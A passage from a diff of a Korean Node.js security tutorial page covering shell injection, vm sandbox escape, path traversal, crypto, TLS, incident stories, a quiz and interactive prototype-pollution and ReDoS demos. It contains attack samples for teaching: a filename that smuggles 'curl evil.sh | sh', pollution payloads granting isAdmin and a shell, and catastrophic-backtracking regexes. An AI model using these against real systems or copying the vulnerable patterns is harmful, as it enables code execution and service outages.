+      <tr><td><code>--secure-heap=n</code></td><td>OpenSSL 키 자료를 별도 보호 힙에</td><td>메모리 사용 증가. 하드웨어 보안 환경에서</td></tr>
+      <tr><td><code>--report-exclude-env</code></td><td>진단 리포트에서 환경변수 제외</td><td>없음. 켜 둘 것</td></tr>
+      <tr><td><code>--tls-min-v1.2</code> (기본), <code>--tls-min-v1.3</code></td><td>TLS 하한</td><td>구형 클라이언트 거부</td></tr>
+    </table></div>
+  </section>
+
+  <section id="s7">
+    <h2>7. 위험한 API: 코드 실행, 명령, 경로</h2>
+    <h3>7.1 eval, new Function, vm은 샌드박스가 아니다</h3>
+    <p><code>vm.runInNewContext</code>는 <b>새 전역 객체</b>를 주는 것이지 격리를 주는 것이 아닙니다. 컨텍스트 안의 코드는 <code>this.constructor.constructor('return process')()</code>처럼 프로토타입 체인을 타고 호스트의 <code>Function</code>에 도달해 <code>process</code>를 얻습니다. 공식 문서도 "신뢰할 수 없는 코드를 실행하는 보안 메커니즘이 아니다"라고 명시합니다. 사용자 코드를 실행해야 한다면 별도 프로세스 + 권한 모델 + 컨테이너(gVisor, Firecracker), 또는 isolated-vm(V8 isolate 분리)이나 WebAssembly 런타임 수준의 격리가 필요합니다.</p>
+    <h3>7.2 명령 실행: exec는 셸이다</h3>
+    <div class="compare">
+      <div><div class="lbl bad">셸 인젝션</div><pre><code>const { exec } = require('node:child_process');
+// filename = "a.png; curl evil.sh | sh"
+exec(`convert ${filename} out.png`, cb);
+// /bin/sh -c "convert a.png; curl evil.sh | sh out.png"</code></pre></div>
+      <div><div class="lbl ok">인자 배열, 셸 없음</div><pre><code>const { execFile } = require('node:child_process');
+execFile('convert', [filename, 'out.png'], { timeout: 10_000, maxBuffer: 1e6 }, cb);
+// 셸을 거치지 않으므로 ; | $ 는 그냥 문자
+// 추가로 filename 을 허용 문자 집합으로 검증</code></pre></div>
+    </div>
+    <p><code>spawn</code>/<code>execFile</code>에 <code>shell: true</code>를 주면 다시 <code>exec</code>와 같아집니다. 그리고 3절의 프로토타입 오염으로 <code>shell</code> 옵션이 주입될 수 있다는 점이 두 취약점이 연결되는 지점입니다.</p>
+    <h3>7.3 경로 탐색</h3>
+<pre><code>const path = require('node:path');
+const ROOT = path.resolve('/srv/uploads');
+function safeJoin(userPath) {
+  const full = path.resolve(ROOT, userPath);          // '../../etc/passwd' 를 정규화
+  if (full !== ROOT &amp;&amp; !full.startsWith(ROOT + path.sep)) throw new Error('path traversal');
+  return full;                                         // 심볼릭 링크는 fs.realpath 로 한 번 더 검사
+}</code></pre>
+    <p><code>path.join(ROOT, userPath)</code>만으로는 부족합니다. <code>..</code>가 정규화되어 ROOT 밖으로 나갑니다. 접두 검사에 <code>path.sep</code>을 붙이는 이유는 <code>/srv/uploads-secret</code>이 <code>/srv/uploads</code>로 시작하기 때문입니다. URL 인코딩(<code>%2e%2e</code>), 널 바이트, 유니코드 정규화도 검사 전에 디코딩되어야 합니다(Express는 경로를 디코딩해 줌).</p>
+    <h3>7.4 역직렬화와 기타</h3>
+    <ul>
+      <li><code>node-serialize</code>류의 "함수까지 직렬화"하는 라이브러리는 RCE 그 자체입니다. JSON만 쓰세요. <code>v8.deserialize</code>도 신뢰할 수 없는 입력에는 금지.</li>
+      <li>YAML 파서는 <code>safeLoad</code>/기본 안전 스키마. XML은 외부 엔티티(XXE) 비활성화.</li>
+      <li>SSRF: 사용자 제공 URL로 <code>fetch</code>하기 전에 호스트를 허용 목록과 대조하고, 사설 IP·메타데이터 엔드포인트(169.254.169.254)를 거부. DNS 리바인딩 때문에 <b>해석된 IP</b>로 검사해야 합니다.</li>
+      <li>에러 응답에 스택 트레이스·파일 경로·의존성 버전을 담지 않습니다(<code>NODE_ENV=production</code>에서 Express 기본 동작). 14장.</li>
+    </ul>
+  </section>
+
+  <section id="s8">
+    <h2>8. 시크릿과 암호 사용</h2>
+    <h3>8.1 시크릿이 새는 경로</h3>
+    <ul class="checklist">
+      <li>환경변수: <code>/proc/pid/environ</code>, 자식 프로세스 상속(<code>env: {}</code>로 명시 전달), 진단 리포트(<code>--report-exclude-env</code>), 크래시 덤프. 가능하면 파일 마운트 + 시작 시 읽기 + 변수 삭제.</li>
+      <li>로그: 요청 헤더 전체, 설정 객체 덤프, 연결 문자열이 포함된 에러 메시지(pg의 에러에 비밀번호는 없지만 URL 전체를 찍는 코드가 흔함). 15장 redaction.</li>
+      <li>힙 스냅샷/코어 덤프: 메모리 안의 문자열은 그대로 보임. 덤프 파일의 접근 권한과 보관 기간.</li>
+      <li>소스 저장소: <code>.env</code> 커밋, 테스트 픽스처의 실제 키. git-secrets/gitleaks를 pre-commit과 CI에.</li>
+      <li>클라이언트 번들: 서버용 키가 프론트엔드 번들에 포함(<code>NEXT_PUBLIC_</code> 접두 실수 등).</li>
+    </ul>
+    <h3>8.2 crypto 올바르게</h3>
+    <div class="tbl-wrap"><table>
+      <tr><th>용도</th><th>맞음</th><th>틀림</th></tr>
+      <tr><td>토큰·ID·솔트</td><td><code>crypto.randomBytes(32).toString('base64url')</code>, <code>crypto.randomUUID()</code></td><td><code>Math.random()</code>(예측 가능), 타임스탬프, 자동 증가 ID를 토큰으로</td></tr>
+      <tr><td>비밀번호 저장</td><td><code>argon2</code>(argon2id) 또는 <code>crypto.scrypt</code>. 비용 파라미터를 하드웨어에 맞춰 ~100ms. <b>비동기 버전</b>(스레드풀, 3장)</td><td>단순 SHA-256, MD5, 솔트 없는 해시, <code>scryptSync</code>를 요청 경로에서</td></tr>
+      <tr><td>HMAC/토큰 비교</td><td><code>crypto.timingSafeEqual(a, b)</code>(길이 같을 때만 호출, 아니면 먼저 길이 비교)</td><td><code>===</code> 문자열 비교(타이밍 공격)</td></tr>
+      <tr><td>대칭 암호화</td><td><code>aes-256-gcm</code> + 랜덤 12바이트 IV + 인증 태그 저장. 키는 KMS에서</td><td>ECB, 고정 IV, 인증 없는 CBC</td></tr>
+      <tr><td>JWT</td><td>알고리즘을 서버가 고정(<code>algorithms: ['RS256']</code>), 만료 짧게, 키 회전</td><td><code>alg: none</code> 허용, HS256 키 혼동, 검증 없이 decode</td></tr>
+      <tr><td>브라우저 호환 코드</td><td><code>globalThis.crypto.subtle</code>(Web Crypto, Node 19+ 전역)</td><td>-</td></tr>
+    </table></div>
+<pre><code>const crypto = require('node:crypto');
+// 비밀번호 해시: 비동기 scrypt (스레드풀)
+const salt = crypto.randomBytes(16);
+const hash = await new Promise((res, rej) =&gt; crypto.scrypt(password, salt, 64, { N: 2 ** 15, r: 8, p: 1 }, (e, k) =&gt; e ? rej(e) : res(k)));
+// 검증
+const cand = await scryptAsync(input, salt, 64, opts);
+const ok = cand.length === hash.length &amp;&amp; crypto.timingSafeEqual(cand, hash);</code></pre>
+    <h3>8.3 TLS</h3>
+    <p>Node 22의 기본 하한은 TLS 1.2, 상한 1.3이며 OpenSSL 3 기본 암호군을 씁니다. 내부 서비스 간에도 TLS(mTLS)를 쓰는 경우 인증서 검증을 끄는 <code>rejectUnauthorized: false</code>와 <code>NODE_TLS_REJECT_UNAUTHORIZED=0</code>은 "개발 편의"가 프로덕션까지 흘러가는 대표적 사고입니다. 사설 CA는 <code>NODE_EXTRA_CA_CERTS</code>로 추가하세요.</p>
+  </section>
+
+  <section id="s9">
+    <h2>9. 보안 릴리스 추적과 운영 절차</h2>
+    <ul>
+      <li><b>릴리스 라인</b>: 짝수 메이저가 LTS(활성 12개월 + 유지 18개월, 총 30개월). 2026년 10월 기준 Node 20은 EOL(2026-04), 22와 24가 LTS. EOL 버전은 보안 패치가 없으므로 사용 자체가 취약점입니다.</li>
+      <li><b>보안 릴리스</b>: nodejs.org 블로그에 약 1주 전 사전 공지(영향 라인, 심각도)가 올라오고, 릴리스 당일 CVE 상세가 공개됩니다. 공지 RSS/메일링(nodejs-sec)을 구독하고, 당일 패치할 수 있는 파이프라인(베이스 이미지 재빌드 → 테스트 → 롤아웃)을 미리 갖추세요.</li>
+      <li><b>의존성도 같은 주기로</b>: 주간 자동 PR(Renovate) + lockfile 검증. 메이저는 수동.</li>
+      <li><b>이미지 스캔</b>: Trivy/Grype로 OS 패키지 + Node 의존성 CVE를 빌드 시 스캔. distroless/slim으로 OS 표면 축소(14장).</li>
+      <li><b>런타임 점검</b>: <code>node --permission</code> 가능 여부, <code>USER node</code>, 읽기 전용 루트 FS, 인스펙터 포트 미노출, <code>--report-exclude-env</code>.</li>
+      <li><b>HTTP 보안 헤더</b>(웹 응답을 내는 경우): helmet 또는 직접 CSP, HSTS, X-Content-Type-Options. API 전용이면 CORS 허용 목록을 좁게.</li>
+    </ul>
+  </section>
+
+  <section id="s10">
+    <h2>10. 현업 사고 사례</h2>
+    <div class="callout danger"><span class="title">사례 1: CI에서 설치 스크립트가 환경변수를 외부로</span>
+      <p>인기 유틸 패키지의 메인테이너 계정이 피싱으로 탈취되고 패치 버전에 postinstall이 추가됐습니다. <code>^</code> 범위 + lockfile 미커밋 레포는 다음 CI에서 자동으로 설치했고, 스크립트가 <code>process.env</code> 전체를 외부로 전송. 클라우드 키가 유출되어 전면 회전. 이후 조치: lockfile 커밋 + <code>npm ci --ignore-scripts</code>, OIDC 기반 단기 자격증명으로 CI의 장기 키 제거.</p>
+    </div>
+    <div class="callout danger"><span class="title">사례 2: 이메일 검증 정규식 하나로 전체 API 다운</span>
+      <p>회원가입의 이메일 정규식이 <code>^([a-zA-Z0-9]+[._-]?)*@...</code> 형태의 중첩 반복. 공격자가 아닌 봇이 500자짜리 잘못된 이메일을 보냈고, 요청 하나가 루프를 수 분간 점유. 헬스체크 실패로 파드 재시작, 봇은 재시도. 입력 길이 254자 제한과 패턴 단순화로 해결. 위 시각화에서 <code>^(\w+\s?)*$</code>를 n=25로 돌려 보세요.</p>
+    </div>
+    <div class="callout danger"><span class="title">사례 3: 설정 병합으로 관리자 권한</span>
+      <p>사용자 프로필 업데이트 API가 <code>deepMerge(user, req.body)</code>로 부분 업데이트를 구현. 바디에 <code>{"__proto__":{"role":"admin"}}</code>을 보내자 이후 생성되는 모든 객체에 <code>role</code>이 상속되어 권한 체크가 통과. 로그에는 아무 에러도 없었고, 다른 사용자의 요청까지 영향을 받아 원인 추적에 며칠이 걸림. additionalProperties:false 스키마와 키 거부 병합으로 수정, <code>--disable-proto=delete</code> 추가.</p>
+    </div>
+    <div class="callout danger"><span class="title">사례 4: 디버그 편의가 남긴 인스펙터</span>
+      <p>장애 분석 중 <code>SIGUSR1</code>로 인스펙터를 열고 닫지 않았고, 파드 매니페스트에 디버그용 <code>hostNetwork: true</code>가 남아 9229 포트가 노드 IP로 노출. 내부망 스캔에서 발견되어 사고로 분류. 인스펙터 사용 절차에 "종료 확인"을 추가하고 네트워크 정책으로 9229 차단.</p>
+    </div>
+  </section>
+
+  <div class="summary"><h3>핵심 요약</h3><ul>
+    <li>공급망: lockfile 커밋 + <code>npm ci --ignore-scripts</code>, provenance 검증, 스코프·레지스트리 고정, 최소 권한/OIDC 토큰, 의존성 수 자체를 줄이기. <code>npm audit</code>은 출발점일 뿐.</li>
+    <li>프로토타입 오염: 재귀 병합에서 <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> 거부, <code>Object.hasOwn</code>, <code>Object.create(null)</code>, 스키마 <code>additionalProperties:false</code>, <code>--disable-proto=delete</code>.</li>
+    <li>ReDoS: 중첩 반복·겹치는 선택지가 지수 백트래킹을 만들고 루프를 동기적으로 멈춘다. 입력 길이 제한, 정규식 린터, RE2, 파서 사용.</li>
+    <li>HTTP 한계값: <code>maxHeaderSize</code> 16KiB, <code>headersTimeout</code> 60s(낮출 것), <code>requestTimeout</code> 300s, 바디·압축 해제 상한. 프록시가 1차, Node가 2차 방어선.</li>
+    <li>권한 모델(<code>--permission</code> + <code>--allow-*</code>)은 프로세스의 행동 반경을 줄이지만 샌드박스는 아니다. <code>vm</code>도 샌드박스가 아니다.</li>
+    <li><code>exec</code> 대신 <code>execFile</code>/<code>spawn</code> 배열, 경로는 <code>path.resolve</code> + 접두 검사, 토큰은 <code>randomBytes</code>, 비밀번호는 argon2/scrypt 비동기, 비교는 <code>timingSafeEqual</code>.</li>
+    <li>EOL Node 사용 금지. 보안 릴리스 사전 공지를 구독하고 당일 패치 파이프라인을 갖춘다.</li>
+  </ul></div>
+
+  <h2>확인 문제</h2>
+  <div class="quiz" data-answer="2">
+    <div class="q"><code>JSON.parse('{"__proto__":{"x":1}}')</code>를 실행했다. 이 시점에 <code>({}).x</code>의 값은?</div>
+    <button class="opt">1 — 프로토타입이 오염된다</button>
+    <button class="opt">SyntaxError가 발생한다</button>
+    <button class="opt">undefined — JSON.parse는 "__proto__"를 일반 own property로 만들 뿐이다</button>
+    <button class="opt">null</button>
+    <div class="explain">JSON.parse는 안전합니다. 오염은 그 결과를 키 검사 없이 <em>다른 객체에 재귀 복사</em>할 때 <code>target['__proto__']</code> 접근자를 통해 일어납니다.</div>
+  </div>
+  <div class="quiz" data-answer="1">
+    <div class="q">다음 중 ReDoS에 취약한 패턴은?</div>
+    <button class="opt"><code>^[a-z]+@[a-z]+\.[a-z]{2,}$</code></button>
+    <button class="opt"><code>^(\w+\s?)*$</code></button>
+    <button class="opt"><code>^\d{4}-\d{2}-\d{2}$</code></button>
+    <button class="opt"><code>^[^=]+=[^=]+$</code></button>
+    <div class="explain"><code>(\w+\s?)*</code>는 바깥 <code>*</code>와 안쪽 <code>+</code>가 중첩되어 있고 <code>\s?</code>가 선택적이라, "wordword"를 나누는 방법이 지수적으로 많습니다. 끝에 매칭 불가 문자가 오면 모든 분할을 시도합니다. 나머지는 각 위치에서 경로가 하나뿐입니다.</div>
+  </div>
+  <div class="quiz" data-answer="3">
+    <div class="q"><code>node --permission --allow-fs-read=/app server.js</code>로 띄운 서버에서 가장 올바른 설명은?</div>
+    <button class="opt">네이티브 애드온 로드는 기본 허용된다</button>
+    <button class="opt">vm 모듈로 실행한 코드도 완전히 격리된다</button>
+    <button class="opt">/app 하위 쓰기도 허용된다</button>
+    <button class="opt">child_process와 worker_threads 사용 시 ERR_ACCESS_DENIED가 발생하고, /app 밖 읽기도 거부된다</button>
+    <div class="explain">권한 모델은 명시 허용 외 전부 거부입니다. 쓰기는 <code>--allow-fs-write</code>, 자식 프로세스는 <code>--allow-child-process</code>, 워커는 <code>--allow-worker</code>, 애드온은 <code>--allow-addons</code>가 각각 필요합니다. vm은 권한 모델과 무관하게 샌드박스가 아닙니다.</div>
+  </div>
+  <div class="quiz" data-answer="0">
+    <div class="q">slowloris 공격(헤더를 아주 천천히 보내 커넥션 점유)을 Node 레벨에서 완화하는 설정은?</div>
+    <button class="opt">server.headersTimeout을 낮춘다</button>
+    <button class="opt">server.keepAliveTimeout을 올린다</button>
+    <button class="opt">--max-http-header-size를 올린다</button>
+    <button class="opt">server.maxRequestsPerSocket을 0으로 둔다</button>
+    <div class="explain"><code>headersTimeout</code>은 헤더 수신이 완료되어야 하는 시한입니다. 기본 60초를 10~30초로 낮추면 느린 헤더 커넥션이 빨리 정리됩니다. <code>requestTimeout</code>은 바디까지 포함한 전체 시한입니다.</div>
+  </div>
+  <div class="quiz" data-answer="2">
+    <div class="q">CI에서 공급망 공격의 피해를 가장 직접적으로 줄이는 조합은?</div>
+    <button class="opt">npm install + npm audit fix --force</button>
+    <button class="opt">node_modules를 커밋한다</button>
+    <button class="opt">lockfile 커밋 + npm ci --ignore-scripts + 최소 권한(OIDC) 자격증명</button>
+    <button class="opt">모든 의존성을 latest로 고정한다</button>
+    <div class="explain">lockfile은 "어제와 같은 트리"를, --ignore-scripts는 설치 시 코드 실행 차단을, 단기 OIDC 자격증명은 유출 시 피해 축소를 담당합니다. node_modules 커밋은 재현성은 주지만 갱신·검토가 불가능해집니다.</div>
+  </div>
+
+  <h2>실습 과제</h2>
+  <ol>
+    <li><b>ReDoS 측정.</b> <code>node -e "const t=Date.now(); /^(\w+\s?)*$/.test('a '.repeat(N)+'!'); console.log(Date.now()-t)"</code>를 N=10, 15, 20, 22, 24로 실행해 시간이 어떻게 늘어나는지 기록하세요(N이 커지면 수십 초가 걸릴 수 있으니 N=26 이상은 주의). 그다음 패턴을 <code>^\w+(\s\w+)*\s?$</code>로 바꿔 같은 입력에서 밀리초 단위로 끝나는지 확인합니다. <code>re2</code> 패키지가 있다면 원 패턴을 RE2로 실행해 선형 시간임도 확인하세요.</li>
+    <li><b>프로토타입 오염 재현과 방어.</b> 3절의 취약 merge를 파일로 만들어 <code>node vuln.js</code>로 <code>({}).isAdmin === true</code>를 확인한 뒤, (a) <code>node --disable-proto=delete vuln.js</code> (b) 페이로드를 <code>{"constructor":{"prototype":{"isAdmin":true}}}</code>로 바꾼 뒤 (a)를 다시 실행해 플래그로 막히지 않는 경로가 있음을 확인하고, (c) 키 거부 + <code>Object.hasOwn</code> 버전으로 둘 다 막히는지 확인하세요.</li>
+    <li><b>권한 모델 적용.</b> 기존 서비스(또는 express hello world)를 <code>node --permission</code>으로 띄워 어떤 호출이 ERR_ACCESS_DENIED로 실패하는지 목록을 만들고, 최소한의 <code>--allow-fs-read</code> 경로만으로 정상 동작하게 만드세요. 최신 Node라면 <code>--permission-audit</code>로 먼저 기록만 해 보세요. 기대: 템플릿/정적 파일 경로, 사설 CA 경로, 그리고 흔히 잊는 <code>/proc</code>·<code>/etc/resolv.conf</code> 읽기가 드러납니다.</li>
+  </ol>
+</main>
+
+<script>
+(function () {
+  const $ = id => document.getElementById(id);
+
+  // ===== 위젯 1: 프로토타입 오염 (격리 realm) =====
+  (function () {
+    const IMPL = {
+      vuln: `function merge(t, s) { for (const k in s) { if (typeof s[k] === 'object' && s[k] !== null) { if (!t[k]) t[k] = {}; merge(t[k], s[k]); } else t[k] = s[k]; } return t; }`,
+      deny: `function merge(t, s) { for (const k in s) { if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue; if (typeof s[k] === 'object' && s[k] !== null) { if (!t[k]) t[k] = {}; merge(t[k], s[k]); } else t[k] = s[k]; } return t; }`,
+      hasown: `function merge(t, s) { for (const k of Object.keys(s)) { if (!Object.hasOwn(s, k)) continue; if (k === '__proto__') continue; if (typeof s[k] === 'object' && s[k] !== null) { if (!Object.hasOwn(t, k)) t[k] = Object.create(null); merge(t[k], s[k]); } else t[k] = s[k]; } return t; }`,
+      freeze: `Object.freeze(Object.prototype); function merge(t, s) { for (const k in s) { if (typeof s[k] === 'object' && s[k] !== null) { if (!t[k]) t[k] = {}; merge(t[k], s[k]); } else t[k] = s[k]; } return t; }`,
+    };
+    $("pp-p1").onclick = () => $("pp-payload").value = '{"name":"guest","__proto__":{"isAdmin":true,"shell":"/bin/sh"}}';
+    $("pp-p2").onclick = () => $("pp-payload").value = '{"name":"guest","constructor":{"prototype":{"isAdmin":true}}}';
+    $("pp-run").onclick = () => {
+      const impl = $("pp-impl").value, payload = $("pp-payload").value;
+      const ifr = document.createElement("iframe"); ifr.style.display = "none"; document.body.append(ifr);
+      const w = ifr.contentWindow;
+      let out;
+      try {
+        const code = `${IMPL[impl]}
+          const payload = JSON.parse(${JSON.stringify(payload)});
+          const target = ${impl === "hasown" ? "Object.create(null)" : "{}"};
+          let err = null;
+          try { merge(target, payload); } catch (e) { err = String(e); }
+          const fresh = {};
+          JSON.stringify({ err, own: Object.keys(target), targetIsAdmin: target.isAdmin, freshIsAdmin: fresh.isAdmin, freshShell: fresh.shell, protoKeys: Object.getOwnPropertyNames(Object.prototype).filter(k => ['isAdmin','shell','role'].includes(k)) });`;
+        out = JSON.parse(w.eval(code));
+      } catch (e) { out = { err: String(e) }; }
+      ifr.remove();
+      const polluted = out.freshIsAdmin !== undefined || out.freshShell !== undefined || (out.protoKeys && out.protoKeys.length);
+      $("pp-out").innerHTML =
+        `merge 결과 own keys: ${MM.esc(JSON.stringify(out.own || []))}\n` +
+        `target.isAdmin: ${MM.esc(String(out.targetIsAdmin))}\n` +
+        `새 객체 ({}).isAdmin: <span class="${polluted ? "bad" : "ok"}">${MM.esc(String(out.freshIsAdmin))}</span>   ({}).shell: ${MM.esc(String(out.freshShell))}\n` +
+        `Object.prototype 에 추가된 키: ${MM.esc(JSON.stringify(out.protoKeys || []))}\n` +
+        (out.err ? `예외: ${MM.esc(out.err)}\n` : "") +
+        (polluted ? `<span class="bad">→ 오염됨: 이 렘의 모든 객체가 isAdmin 을 상속한다. (페이지는 격리된 iframe 이라 안전)</span>` :
+          impl === "freeze" ? `<span class="ok">→ 오염 안 됨.</span> 동결된 프로토타입에 대한 쓰기는 조용히 무시된다(strict 모드면 TypeError). 단, 프로토타입을 확장하는 라이브러리가 깨질 수 있다.` :
+          impl === "hasown" && out.targetIsAdmin ? `<span class="ok">→ 오염 안 됨.</span> target 은 Object.create(null) 이라 __proto__ 가 접근자가 아닌 일반 키로 들어갔다(target.isAdmin 은 payload 구조상 undefined, own keys 를 보라).` :
+          `<span class="ok">→ 오염 안 됨.</span> 위험 키가 거부되었다. constructor.prototype 페이로드도 시도해 보라.`);
+    };
+    $("pp-run").onclick();
+  })();
+
+  // ===== 위젯 2: ReDoS 백트래킹 매처 =====
+  (function () {
+    // 미니 정규식: 리터럴, ., \w \d \s, [클래스], 그룹(…), 선택 |, 수량자 * + ? {n,m}, 앵커 ^ $
+    function parse(src) {
+      let i = 0;
+      function parseAlt() { const alts = [parseSeq()]; while (src[i] === "|") { i++; alts.push(parseSeq()); } return alts.length === 1 ? alts[0] : { t: "alt", alts }; }
+      function parseSeq() { const items = []; while (i < src.length && src[i] !== "|" && src[i] !== ")") items.push(parseQuant()); return { t: "seq", items }; }
+      function parseQuant() {
+        let atom = parseAtom();
+        for (;;) {
+          const c = src[i];
+          if (c === "*") { i++; atom = { t: "rep", min: 0, max: Infinity, node: atom }; }
+          else if (c === "+") { i++; atom = { t: "rep", min: 1, max: Infinity, node: atom }; }
+          else if (c === "?") { i++; atom = { t: "rep", min: 0, max: 1, node: atom }; }
+          else if (c === "{") { const m = /^\{(\d+)(,(\d*))?\}/.exec(src.slice(i)); if (!m) break; i += m[0].length; atom = { t: "rep", min: +m[1], max: m[2] ? (m[3] ? +m[3] : Infinity) : +m[1], node: atom }; }
+          else break;
+        }
+        return atom;
+      }
+      function parseAtom() {
+        const c = src[i++];
+        if (c === "(") { if (src.startsWith("?:", i)) i += 2; const n = parseAlt(); if (src[i] !== ")") throw new Error("닫는 괄호 없음"); i++; return n; }
+        if (c === "^") return { t: "bol" };
+        if (c === "$") return { t: "eol" };
+        if (c === ".") return { t: "ch", f: ch => ch !== "\n" };
+        if (c === "\\") { const e = src[i++]; const map = { w: ch => /\w/.test(ch), d: ch => /\d/.test(ch), s: ch => /\s/.test(ch), W: ch => /\W/.test(ch), D: ch => /\D/.test(ch), S: ch => /\S/.test(ch) }; if (map[e]) return { t: "ch", f: map[e] }; return { t: "ch", f: ch => ch === e }; }
+        if (c === "[") { let j = src.indexOf("]", i); if (j < 0) throw new Error("닫는 ] 없음"); const body = src.slice(i, j); i = j + 1; const re = new RegExp("^[" + body + "]$"); return { t: "ch", f: ch => re.test(ch) }; }
+        if (c === undefined) throw new Error("패턴이 비었습니다");
+        return { t: "ch", f: ch => ch === c };
+      }
+      const n = parseAlt(); if (i < src.length) throw new Error("파싱 오류 위치 " + i); return n;
+    }
+    let steps = 0, cap = 3e6;
+    function m(node, s, pos, k) {
+      if (++steps > cap) throw new Error("cap");
+      switch (node.t) {
+        case "ch": return pos < s.length && node.f(s[pos]) ? k(pos + 1) : false;
+        case "bol": return pos === 0 ? k(pos) : false;
+        case "eol": return pos === s.length ? k(pos) : false;
+        case "seq": { const go = (idx, p) => idx === node.items.length ? k(p) : m(node.items[idx], s, p, p2 => go(idx + 1, p2)); return go(0, pos); }
+        case "alt": for (const a of node.alts) if (m(a, s, pos, k)) return true; return false;
+        case "rep": { const rep = (p, cnt) => { if (cnt < node.max && m(node.node, s, p, p2 => p2 === p ? false : rep(p2, cnt + 1))) return true; return cnt >= node.min ? k(p) : false; }; return rep(pos, 0); }
+      }
+    }
+    function count(ast, s) { steps = 0; try { let ok = false; for (let st = 0; st <= s.length && !ok; st++) { ok = m(ast, s, st, () => true); if (ast.t === "seq" && ast.items[0] && ast.items[0].t === "bol") break; } return { steps, ok }; } catch (e) { if (e.message === "cap") return { steps: cap, ok: null, capped: true }; throw e; } }
+
+    const PRESETS = [
+      ["^(a+)+$  (중첩 반복, 지수)", "^(a+)+$", "a", "!"],
+      ["^(\\w+\\s?)*$  (이메일/이름 검증에서 흔함, 지수)", "^(\\w+\\s?)*$", "ab ", "!"],
+      ["^(a|aa)+$  (겹치는 선택지, 지수)", "^(a|aa)+$", "a", "!"],
+      ["^.*=.*=.*;$  (연속 .*, 다항)", "^.*=.*=.*;$", "=", "!"],
+      ["^a+$  (안전, 선형)", "^a+$", "a", "!"],
+      ["^\\w+(\\s\\w+)*$  (수정된 안전 버전)", "^\\w+(\\s\\w+)*$", "ab ", "!"],
+    ];
+    PRESETS.forEach((p, i) => $("rd-preset").append(MM.el("option", { value: i }, p[0])));
+    function applyPreset() { const p = PRESETS[$("rd-preset").value]; $("rd-pat").value = p[1]; $("rd-unit").value = p[2]; $("rd-tail").value = p[3]; }
+    $("rd-preset").onchange = applyPreset; applyPreset();
+    $("rd-n").oninput = () => $("rd-n-v").textContent = $("rd-n").value;
+
+    function draw(points, label) {
+      const svg = $("rd-svg"); const W = 440, H = 190, pad = 28;
+      const maxv = Math.max(...points.map(p => p.v), 10);
+      const logmax = Math.log10(maxv);
+      const bw = (W - pad - 6) / points.length;
+      let h = `<line x1="${pad}" y1="${H - 18}" x2="${W - 4}" y2="${H - 18}" style="stroke:var(--border)"/>`;
+      for (let e = 0; e <= Math.ceil(logmax); e += Math.max(1, Math.ceil(logmax / 5))) { const y = H - 18 - (e / logmax) * (H - 30); h += `<text x="2" y="${y + 3}">1e${e}</text><line x1="${pad}" y1="${y}" x2="${W - 4}" y2="${y}" style="stroke:var(--border);stroke-dasharray:2 3"/>`; }
+      points.forEach((p, i) => { const hh = p.v > 0 ? Math.max(1, Math.log10(p.v) / logmax * (H - 30)) : 0; h += `<rect class="bar ${p.hot ? "hot" : ""}" x="${pad + i * bw + 1}" y="${H - 18 - hh}" width="${Math.max(1, bw - 2)}" height="${hh}"><title>n=${p.n}: ${p.v.toLocaleString()} ${label}</title></rect>`; if (points.length <= 24 || i % 4 === 0) h += `<text x="${pad + i * bw + bw / 2}" y="${H - 6}" text-anchor="middle">${p.n}</text>`; });
+      svg.innerHTML = h;
+    }
+    function growth(points) {
+      const v = points.filter(p => p.v > 0 && !p.capped).map(p => p.v);
+      if (v.length < 4) return "?";
+      const r1 = v[v.length - 1] / v[v.length - 2], r2 = v[v.length - 2] / v[v.length - 3];
+      const n1 = points[points.length - 1].n, n2 = points[points.length - 2].n, n3 = points[points.length - 3].n;
+      if (Math.abs(r1 - r2) < 0.15 * r1 && r1 > 1.5) return `지수 (×${r1.toFixed(2)}/글자)`;
+      const k = Math.log(v[v.length - 1] / v[v.length - 3]) / Math.log(n1 / n3);
+      return k < 1.3 ? "선형" : `다항 O(n^${k.toFixed(1)})`;
+    }
+    $("rd-run").onclick = () => {
+      let ast; try { ast = parse($("rd-pat").value); } catch (e) { $("rd-log").textContent = "패턴 오류: " + e.message; return; }
+      const unit = $("rd-unit").value, tail = $("rd-tail").value, N = +$("rd-n").value;
+      const pts = []; const lines = [];
+      for (let n = 1; n <= N; n++) {
+        const s = unit.repeat(n) + tail;
+        const r = count(ast, s);
+        pts.push({ n, v: r.steps, hot: r.steps > 1e5, capped: r.capped });
+        lines.push(`n=${String(n).padStart(2)}  len=${String(s.length).padStart(3)}  시도=${r.capped ? "≥" + cap.toLocaleString() + " (중단)" : r.steps.toLocaleString()}  ${r.ok === null ? "" : r.ok ? "match" : "no match"}`);
+        if (r.capped) break;
+      }
+      draw(pts, "steps");
+      $("rd-steps").textContent = pts[pts.length - 1].capped ? "≥ " + cap.toLocaleString() : pts[pts.length - 1].v.toLocaleString();
+      $("rd-growth").textContent = growth(pts);
+      $("rd-cap").textContent = "매칭 시도 횟수 (로그 스케일). 빨강 = 10만 회 초과.";
+      $("rd-log").textContent = lines.join("\n");
+    };
+    $("rd-real").onclick = () => {
+      let re; try { re = new RegExp($("rd-pat").value); } catch (e) { $("rd-log").textContent = "RegExp 오류: " + e.message; return; }
+      const unit = $("rd-unit").value, tail = $("rd-tail").value, N = Math.min(+$("rd-n").value, 40);
+      const pts = []; const lines = []; let budget = 400; // ms 총 예산
+      for (let n = 1; n <= N; n++) {
+        const s = unit.repeat(n) + tail;
+        const t0 = performance.now(); re.test(s); const dt = performance.now() - t0;
+        pts.push({ n, v: Math.max(dt * 1000, 1), hot: dt > 10 }); // µs
+        lines.push(`n=${String(n).padStart(2)}  ${dt.toFixed(3)} ms`);
+        budget -= dt; if (budget < 0 || dt > 150) { lines.push("… 예산 초과로 중단 (페이지가 멈추는 것을 막기 위해)"); break; }
+      }
+      draw(pts, "µs");
+      $("rd-steps").textContent = (pts[pts.length - 1].v / 1000).toFixed(2) + " ms";
+      $("rd-growth").textContent = growth(pts);
+      $("rd-cap").textContent = "실제 V8 RegExp 실행 시간 (µs, 로그 스케일). 매우 짧은 시간은 측정 노이즈.";
+      $("rd-log").textContent = lines.join("\n");
+    };
+    $("rd-run").onclick();
+  })();
+
+  // ===== 위젯 3: slowloris 스텝 =====
+  (function () {
+    const N = 24; const host = $("sl-conns");
+    for (let i = 0; i < N; i++) host.append(MM.el("span", { class: "sl-conn free", id: "slc" + i }, "-"));
+    function set(states) { states.forEach((st, i) => { const e = $("slc" + i); e.className = "sl-conn " + st[0]; e.textContent = st[1]; }); }
+    function run() {
+      const ht = +$("sl-ht").value;
+      const steps = [
